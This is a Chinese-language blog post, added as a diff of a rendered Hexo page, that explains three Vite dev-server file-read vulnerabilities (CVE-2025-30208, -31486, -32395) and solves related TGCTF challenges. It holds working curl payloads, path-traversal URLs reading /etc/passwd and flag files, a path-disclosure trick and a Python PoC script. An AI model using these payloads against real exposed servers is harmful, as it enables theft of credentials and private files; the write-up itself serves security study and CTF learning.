@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Zbaoabo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Vite CVE-2025-30208 安全漏洞[TOc] 一、漏洞概述CVE-2025-30208 是 Vite（一个前端开发工具提供商）在特定版本中存在的安全漏洞。此漏洞允许攻击者通过特殊的 URL 参数绕过对文件系统的访问限制，从而获取任意文件内容（包括非 Vite 服务目录范围外的文件）。 1.漏洞原理 Vite 在开发服务器模式下提供了 @fs 用于访问服务允许范围内的文件。 本应对超出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zbaoabo">
+<meta property="og:url" content="http://example.com/2025/04/21/ViteCVE/index.html">
+<meta property="og:site_name" content="Zbaoabo">
+<meta property="og:description" content="Vite CVE-2025-30208 安全漏洞[TOc] 一、漏洞概述CVE-2025-30208 是 Vite（一个前端开发工具提供商）在特定版本中存在的安全漏洞。此漏洞允许攻击者通过特殊的 URL 参数绕过对文件系统的访问限制，从而获取任意文件内容（包括非 Vite 服务目录范围外的文件）。 1.漏洞原理 Vite 在开发服务器模式下提供了 @fs 用于访问服务允许范围内的文件。 本应对超出">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/ViteCVE/image-20250421203653806.png">
+<meta property="article:published_time" content="2025-04-21T12:08:17.882Z">
+<meta property="article:modified_time" content="2025-04-21T12:38:23.856Z">
+<meta property="article:author" content="zhangsuhong">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/ViteCVE/image-20250421203653806.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">zhangsuhong</a></h1>
+		</hgroup>
+
+		
+			<p class="header-subtitle"></p>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-ViteCVE" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/21/ViteCVE/" class="article-date">
+  	<time datetime="2025-04-21T12:08:17.882Z" itemprop="datePublished">2025-04-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Vite-CVE-2025-30208-安全漏洞"><a href="#Vite-CVE-2025-30208-安全漏洞" class="headerlink" title="Vite CVE-2025-30208 安全漏洞"></a>Vite CVE-2025-30208 安全漏洞</h1><p>[TOc]</p>
+<h2 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h2><p><strong>CVE-2025-30208</strong> 是 Vite（一个前端开发工具提供商）在特定版本中存在的安全漏洞。此漏洞<strong>允许攻击者通过特殊的 URL 参数</strong>绕过对文件系统的访问限制，从而获取任意文件内容（包括非 Vite 服务目录范围外的文件）。</p>
+<h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h3><ul>
+<li>Vite 在开发服务器模式下提供了 @fs 用于访问服务允许范围内的文件。</li>
+<li>本应对超出范围的文件请求返回 403 Restricted；然而，在请求 URL 中添加 ?raw?? 或 ?import&amp;raw?? 时，可以绕过原有检查。</li>
+<li>这是由于在多个处理环节中会移除类似 ? 的结尾分隔符，但并未在查询字符串的正则匹配中考虑这一点；攻击者可利用这一缺陷读取目标文件内容。</li>
+</ul>
+<h3 id="2-漏洞影响"><a href="#2-漏洞影响" class="headerlink" title="2.漏洞影响"></a>2.漏洞影响</h3><ul>
+<li>在特定配置下，攻击者能够访问服务器上任意位置的文件（如 &#x2F;tmp&#x2F;secret.txt），并将内容返回给浏览器。</li>
+<li>仅在 <strong>显式暴露 Vite 开发服务器</strong>（如使用 –host 或在 server.host 中配置对外可访问）时，外部才可直接发起请求进行文件读取。</li>
+<li>如果文件中包含敏感数据（如凭据、配置等），则可能造成信息泄露。</li>
+</ul>
+<h3 id="3-不受影响场景"><a href="#3-不受影响场景" class="headerlink" title="3.不受影响场景"></a>3.不受影响场景</h3><ul>
+<li>在本地开发环境使用 Vite，不对外暴露端口；仅自己访问 localhost。</li>
+<li>已经将代码打包后交由 Nginx&#x2F;Tomcat&#x2F;Egg 等服务器代理，生产环境<strong>并无</strong>开启 Vite Dev Server。</li>
+<li>使用修复后的 Vite 版本</li>
+</ul>
+<h2 id="二、漏洞成因"><a href="#二、漏洞成因" class="headerlink" title="二、漏洞成因"></a>二、漏洞成因</h2><ul>
+<li><strong>核心问题</strong>：当请求 URL 带有 ?raw?? &#x2F; ?import&amp;raw?? 等结尾分隔符时，Vite 中移除 ? 等尾部分隔符的逻辑与查询字符串正则不匹配的处理不一致，导致访问超出允许列表的文件时的“403”限制被绕过。</li>
+</ul>
+<h2 id="三、漏洞利用实例"><a href="#三、漏洞利用实例" class="headerlink" title="三、漏洞利用实例"></a>三、漏洞利用实例</h2><ol>
+<li><p>正常情况下，访问 <a target="_blank" rel="noopener" href="http://localhost:5173/@fs/tmp/secret.txt">http://localhost:5173/@fs/tmp/secret.txt</a> 会返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">403 Restricted</span><br><span class="line">The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>2.但在请求后面加上 ?import&amp;raw??：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??&quot;</span><br></pre></td></tr></table></figure>
+
+<p>返回结果将是该文件的内容，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export default &quot;top secret content\n&quot;</span><br><span class="line">//# sourceMappingURL=data:application/json;..</span><br></pre></td></tr></table></figure>
+
+<h3 id="TGCTF-前端GAME"><a href="#TGCTF-前端GAME" class="headerlink" title="TGCTF 前端GAME"></a>TGCTF 前端GAME</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/@fs/etc/passwd?import&amp;raw??</span><br><span class="line"> /@fs/etc/passwd?raw??</span><br><span class="line"> /@fs/tgflagggg?import&amp;raw??</span><br><span class="line"> /@fs/tgflagggg?raw??</span><br></pre></td></tr></table></figure>
+
+<h1 id="CVE-2025-31486）-PLUS"><a href="#CVE-2025-31486）-PLUS" class="headerlink" title="(CVE-2025-31486）(PLUS)"></a>(CVE-2025-31486）(PLUS)</h1><p>该漏洞利用条件较为简单，攻击者可通过特定构造的请求触发安全风险</p>
+<h3 id="POC-1："><a href="#POC-1：" class="headerlink" title="POC 1："></a><strong>POC 1：</strong></h3><ol>
+<li>仅影响Vite 6.0及以上版本（即&gt;&#x3D;6.0.0的受影响版本）；</li>
+<li>仅当被读取的文件大小小于<code>build.assetsInlineLimit</code>配置值时（默认值为4KB）。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://localhost:5173/etc/passwd?.svg?.wasm?init&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="POC-2："><a href="#POC-2：" class="headerlink" title="POC 2："></a><strong>POC 2：</strong></h3><ul>
+<li>需要知道Vite所在的绝对路径</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这里的/x/x/x/vite-project/是指Vite所在的绝对路径</span><br><span class="line">curl &quot;http://localhost:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="TGCTF-前端GAME-plus"><a href="#TGCTF-前端GAME-plus" class="headerlink" title="TGCTF 前端GAME(plus)"></a>TGCTF 前端GAME(plus)</h3><p>flag在根目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd?.svg?.wasm?init</span><br><span class="line"> /tgflagggg?.svg?.wasm?init</span><br><span class="line"> #这个打法，不太好猜路径</span><br><span class="line">curl  &quot;http://node1.tgctf.woooo.tech:32613/@fs/app/?/../../../../../tgflagggg?import&amp;?raw</span><br></pre></td></tr></table></figure>
+
+<p>##（CVE-2025-32395）(ultra)</p>
+<p>复现前需要得到一个Vite所在的绝对路径，秀逗猫之前以为需要猜测，但其实还有技巧，先访问<code>/@fs/tmp/</code>，然后页面会返回如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">403 Restricted</span><br><span class="line">The request url &quot;/tmp&quot; is outside of Vite serving allow list.</span><br><span class="line"></span><br><span class="line">- /root/pseudocat</span><br><span class="line"></span><br><span class="line">Refer to docs https://vite.dev/config/server-options.html#server-fs-allow for configurations and more details.</span><br></pre></td></tr></table></figure>
+
+<p>这里的403页面会回显Vite的allow list，一般而言就是Vite所在的路径了。</p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这里的/x/x/x/vite-project/是指Vite所在的绝对路径</span><br><span class="line">curl --request-target /@fs/x/x/x/vite-project/#/../../../../../etc/passwd http://localhost:5173/</span><br></pre></td></tr></table></figure>
+
+<p>HTTP 1.1规范（RFC 9112）规定在请求目标（request-target）中不允许出现<code>#</code>字符。然而，攻击者是有可能发送包含<code>#</code>的请求的。对于那些请求行（包含请求目标）无效的请求，规范建议服务器返回400错误请求）或301永久重定向）状态码来拒绝这些请求。对于HTTP 2协议也是类似的情况。</p>
+<p>如果是在Node或Bun运行Vite环境下，当收到包含<code>#</code>的请求时，这些运行时内部不会拒绝该请求，而是将其传递到用户代码层面。在这种情况下，<code>http.IncomingMessage.url</code>的值会包含<code>#</code>字符。而Vite在检查<code>server.fs.deny</code>时，假定<code>req.url</code>不会包含<code>#</code>字符，这就导致了包含<code>#</code>的这类请求能够绕过<code>server.fs.deny</code>的检查。</p>
+<p><code>curl --request-target</code>是一个用于手动指定HTTP请求目标的选项，主要用于精确控制请求行的格式，常见于调试、测试或特殊协议场景。</p>
+<p>当然也可以使用Python，注意使用<code>requests</code>没法复现。可以使用<code>http.client</code>，它是Python标准库中提供的一个底层的HTTP客户端模块，直接与网络套接字交互来发送和接收HTTP请求和响应，能够实现类似<code>curl --request-target</code>的功能。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import http.client</span><br><span class="line"></span><br><span class="line"># 替换为实际的 IP 地址</span><br><span class="line">ip = &#x27;xxx.xxx.xxx.xxx&#x27;</span><br><span class="line"># 替换为实际的 PORT 端口</span><br><span class="line">port = 5173</span><br><span class="line"># 定义请求目标路径</span><br><span class="line">request_target = &#x27;/@fs/root/pseudocat/#/../../../../../etc/passwd&#x27;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    # 创建 HTTP 连接</span><br><span class="line">    conn = http.client.HTTPConnection(ip, port)</span><br><span class="line">    # 发起 GET 请求</span><br><span class="line">    conn.request(&#x27;GET&#x27;, request_target)</span><br><span class="line">    # 获取响应</span><br><span class="line">    response = conn.getresponse()</span><br><span class="line">    # 读取响应内容</span><br><span class="line">    data = response.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">    # 打印响应状态码和内容</span><br><span class="line">    print(f&quot;状态码: &#123;response.status&#125;&quot;)</span><br><span class="line">    print(data)</span><br><span class="line">except http.client.HTTPException as http_err:</span><br><span class="line">    print(f&quot;HTTP 异常: &#123;http_err&#125;&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(f&quot;发生其他错误: &#123;e&#125;&quot;)</span><br><span class="line">finally:</span><br><span class="line">    # 关闭连接</span><br><span class="line">    if conn:</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>###TGCTF WEB-前端GAME Ultra</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">访问/@fs/tmp/获得绝对路径/app，同时给了附件看docker也能看出路径</span><br><span class="line">curl --request-target /@fs/app/#/../../../../../etc/passwd </span><br><span class="line">http://node1.tgctf.woooo.tech:32742/</span><br><span class="line"> curl --request-target /@fs/app/#/../../../../../tgflagggg </span><br><span class="line">http://node2.tgctf.woooo.tech:31500/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/ViteCVE/image-20250421203653806.png" alt="image-20250421203653806"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/04/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/04/19/SQL/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 zhangsuhong
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
